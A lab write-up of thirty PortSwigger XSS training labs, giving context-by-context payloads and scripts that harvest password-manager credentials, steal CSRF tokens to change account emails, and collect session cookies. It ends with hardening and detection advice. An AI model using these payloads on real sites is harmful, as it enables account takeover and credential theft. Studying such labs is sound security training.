# PortSwigger XSS 1-30 — Contexts, DOM Sinks, Victim State, and CSP

This is a consolidated walkthrough of the thirty PortSwigger Cross-site scripting labs. The useful lesson is not a payload list. It is the boundary model:

**XSS is a browser parsing bug at a trust boundary.** The same input behaves differently in HTML text, an attribute, a JavaScript string, a URL, an SVG subtree, an Angular expression, a DOM sink, or a CSP-controlled page.

All thirty labs were solved. The two labs that normally invite Collaborator-style collection were completed with same-site collection channels instead.

## 1. Overview

| # | Lab group | Context / sink | Core idea |
|---|-----------|----------------|-----------|
| 1-2 | basic reflected/stored HTML | HTML body / comments | direct script execution |
| 3-6 | DOM sinks | `document.write`, `innerHTML`, jQuery `href`, jQuery selector | read the client-side sink, then break out of the constructed HTML/selector/URL |
| 7-9 | first context escapes | attribute / JavaScript string | close the attribute or JavaScript expression instead of forcing tags |
| 10-13 | DOM and framework variants | select-contained `document.write`, Angular, reflected/stored DOM | adapt to parser state and client-side sanitizers |
| 14-17 | tag/attribute filtering | filtered HTML, custom elements, SVG, canonical link | enumerate allowed browser features and trigger events indirectly |
| 18-21 | JavaScript contexts | script tag, escaped quotes, event handler, template literal | use HTML parser exits, escape interactions, and `${...}` interpolation |
| 22-24 | impact labs | cookie, password, CSRF | use victim state to collect session material or perform a state-changing request |
| 25-28 | expert client-side escapes | Angular sandbox, CSP, SVG animate, `javascript:` URL | abuse expression evaluation, event objects, SVG animation, and error handling |
| 29-30 | CSP | strict CSP / reflected CSP token | dangling markup and policy injection |

## 2. The working decision tree

```text
Where does input land?      -> HTML / attribute / JS string / URL / DOM sink / Angular / SVG / CSP
Who parses it next?         -> HTML parser, JS parser, URL parser, Angular expression engine, sanitizer
How is it triggered?        -> load, error event, focus, resize, hashchange, accesskey, victim bot visit
What proves impact?         -> alert/print, cookie, credentials, CSRF token, account email change
```

This framing avoids guessing. First identify the context, then choose the smallest breakout for that parser.

## 3. Basic HTML and DOM sinks

The unencoded HTML labs are intentionally direct:

```html
<script>alert(1)</script>
```

For DOM XSS, the sink matters more than the server response.

`document.write` inside HTML can be escaped with:

```text
"><svg onload=alert(1)>
```

When the constructed markup is inside a `select`, exit the element first:

```text
"></select><img src=1 onerror=alert(1)>
```

`innerHTML` inserted scripts are unreliable, so event-bearing HTML is the stable proof:

```html
<img src=1 onerror=alert(1)>
```

jQuery `attr('href', ...)` turns a parameter into a navigable URL:

```text
/feedback?returnPath=javascript:alert(document.cookie)
```

The hashchange selector lab needs a delivered page that changes the victim iframe hash:

```html
<iframe src="https://LAB/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

## 4. HTML attributes and JavaScript strings

Attribute context is not tag context. If angle brackets are encoded, close the attribute and add an event handler:

```text
"onmouseover="alert(1)
```

JavaScript string context depends on the exact escaping:

```text
'-alert(1)-'
</script><script>alert(1)</script>
\\'-alert(1)//
```

The key browser detail is that the HTML parser still recognizes `</script>` as the end of the script element even when JavaScript string escaping blocks quote-based escapes.

Template literals have a different escape route. If quotes, backslashes, angle brackets, and backticks are escaped but expression interpolation remains active:

```text
${alert(1)}
```

## 5. Filters, custom tags, SVG, and canonical links

The filtered labs are best treated as feature enumeration:

- most tags blocked: use an allowed `body onresize` combination and trigger it through an iframe resize;
- standard tags blocked: use a custom element with `id`, `tabindex`, and `onfocus`, then navigate to `#id`;
- SVG subset allowed: use `animatetransform onbegin`;
- canonical link injection: add `accesskey` and `onclick` attributes to the canonical link and trigger the shortcut.

Representative shapes:

```html
<xss id=x onfocus=alert(document.cookie) tabindex=1>
```

```html
<svg><animatetransform onbegin=alert(1)>
```

```text
?'accesskey='x'onclick='alert(1)
```

These are not random bypasses. They are browser features that remain reachable after the filter removes the obvious ones.

## 6. AngularJS and expression evaluation

The basic Angular expression lab uses constructor access:

```text
{{$on.constructor('alert(1)')()}}
```

The no-string sandbox escape mutates `charAt` and reconstructs executable text with `fromCharCode` through `orderBy`:

```text
1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(...)
```

The CSP variant uses focus and the event path:

```html
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>
```

The defensive point is that framework expression languages are execution environments. Encoding angle brackets is not a complete control.

## 7. Turning XSS into account impact

### Cookie collection

The cookie lab was solved by posting the victim's `document.cookie` back into the same blog post as a comment, then using the captured session to visit `/my-account`.

The important property is same-site execution: the victim page already contains a valid comment CSRF token, so the script can submit a new comment without any external callback service.

### Password capture

The password lab can be solved without Collaborator by injecting fields that the victim password manager fills and then writing the result back into the same blog comments:

```html
<input name=username id=username autocomplete=username>
<input type=password name=password id=password autocomplete=current-password>
<script>
setInterval(function(){
  var u=document.getElementById('username');
  var p=document.getElementById('password');
  var c=document.querySelector('input[name=csrf]');
  if(u && p && c && p.value && !window.sentCreds){
    window.sentCreds=1;
    fetch('/post/comment', {
      method:'POST',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:new URLSearchParams({
        csrf:c.value,
        postId:'<post-id>',
        comment:'CREDS_MARK '+u.value+':'+p.value,
        name:'collector',
        email:'collector@example.net',
        website:'http://example.net'
      })
    });
  }
},500)
</script>
```

One automation gotcha: do not mistake the marker inside the stored payload source for a real returned comment. Match the rendered collector comment.

### CSRF bypass

The CSRF bypass lab demonstrates why XSS dominates CSRF defenses. The victim browser can read `/my-account`, extract the victim token, and submit the protected form:

```js
var req = new XMLHttpRequest();
req.onload = function() {
  var token = this.responseText.match(/name="csrf" value="([^"]+)"/)[1];
  var r = new XMLHttpRequest();
  r.open('POST', '/my-account/change-email', true);
  r.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  r.send('csrf=' + encodeURIComponent(token) + '&email=xss24@example.net');
};
req.open('GET', '/my-account', true);
req.send();
```

For this run I added a same-site log comment that confirmed `GET /my-account` returned 200, token extraction succeeded, and the email-change POST returned 200.

## 8. CSP labs

Strict CSP changes the objective from script execution to browser-controlled form flow. In the dangling-markup lab, the injected button sends the victim CSRF token to the exploit page as a query parameter; the exploit page then auto-submits a form back to `/my-account/change-email`.

The final CSP bypass lab is policy injection:

```text
?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
```

If user input can alter the CSP header, CSP becomes another injection context.

## 9. Operational notes

- Use a real browser to Store and Deliver exploit-server pages. Raw `curl` posts are enough for simple comments, but browser form state mattered for several delivered labs.
- The `website` field in the stored `href` lab has browser-side `pattern` validation. Raw POST was the clean way to submit `javascript:alert(1)`.
- Stored DOM XSS must be triggered on the actual `post?postId=...` page, not on the comment confirmation page.
- For looping alert/redirect payloads, avoid self-viewing the exploit page repeatedly; store and deliver to the victim instead.
- If a lab truly requires reading a Collaborator/OAST interaction and no same-site, exploit-server, or lab answer endpoint replacement exists, record it as requiring user-assisted OAST review and continue the series.

## 10. Defense and detection

### Hardening

- Encode for the exact output context: HTML text, attribute, JavaScript string, URL, CSS, and JSON are different contexts.
- Avoid dangerous DOM sinks such as `innerHTML`, `document.write`, jQuery selector construction, and URL-bearing attributes for untrusted input.
- Use a mature HTML sanitizer for rich text and do not reuse sanitized HTML inside JavaScript or URL contexts.
- Mark session cookies `HttpOnly`, `Secure`, and `SameSite`; remember that XSS can still perform same-origin actions even when cookies are not readable.
- Bind CSRF tokens to session, path, method, and lifetime, but treat XSS as a bypass of CSRF-only controls.
- Build CSP from constants, not user-controlled fragments. Prefer nonces or hashes over inline allowances.
- Retire AngularJS-era expression surfaces where possible.

### Detection ideas

- Inputs containing `<script`, event attributes, `javascript:`, SVG animation tags, Angular expressions, or template-literal interpolation in user-controlled fields.
- A victim page load followed by unexpected `fetch`/XHR to comment, account, or email-change endpoints.
- Comments containing session-like strings, credential-like pairs, or collector markers posted by a victim user agent.
- CSP violation reports for inline script, blocked `javascript:` URLs, or unusual form-action/navigation attempts.
- Account changes immediately following blog-comment page visits by a victim bot or privileged user.

The durable defensive lesson is simple: XSS is not one filter problem. It is a collection of parser-boundary problems, and every context needs its own escaping, sanitizer, and runtime policy.
